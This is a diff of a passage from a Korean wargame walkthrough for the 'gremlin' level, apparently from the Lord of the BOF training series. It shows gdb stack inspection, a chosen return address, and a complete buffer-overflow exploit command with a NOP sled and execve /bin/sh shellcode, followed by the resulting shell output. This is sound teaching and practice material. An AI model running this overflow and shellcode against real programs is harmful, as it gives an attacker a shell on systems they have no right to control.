@@ -14,23 +14,33 @@ argv[1]이후의 위치에 쉘 코드를 넣고 ret에 쉘코드가 들어가 �
 > (gdb)  r &#96;python -c "print 'A'*260+'BBBB'"&#96; &#96;python -c "print 'CCCC'*20"&#96;
 >
 > Breakpoint 1, 0x8048430 in main ()
+>
 > (gdb) x/100x $esp
 >
-> ~중략~
+>  &#126;중략 &#126;
 >
 > 0xbffffc4c:     0x41414141      0x41414141      0x41414141      0x41414141
+>
 > 0xbffffc5c:     0x41414141      0x42414141      0x00424242      0x43434343
+>
 > 0xbffffc6c:     0x43434343      0x43434343      0x43434343      0x43434343
 
 저 실행때의 결과를 보고 0xbffffc6c로 좌표를 설정했지만 다시 확인 해 보았을 때는 0xbffffc5c가 적합해 보여서 5c로 바꾸었다.
 
 > [gate@localhost gate]$ ./gremlin &#96;python -c "print 'A'*260 + '\x5c\xfc\xff\xbf' "&#96; &#96;python -c "print '\x90'*20+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' "&#96;
+>
 > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\▒▒▒
+>
 > bash$ info
+>
 > info: Terminal type &#96;dumb' is not smart enough to run Info.
+>
 > bash$ my-pass
+>
 > euid = 501
+>
 > hello bof world
+>
 > bash$
 
 위 처럼 쉘을 따는데 성공한 것을 볼 수 있다.
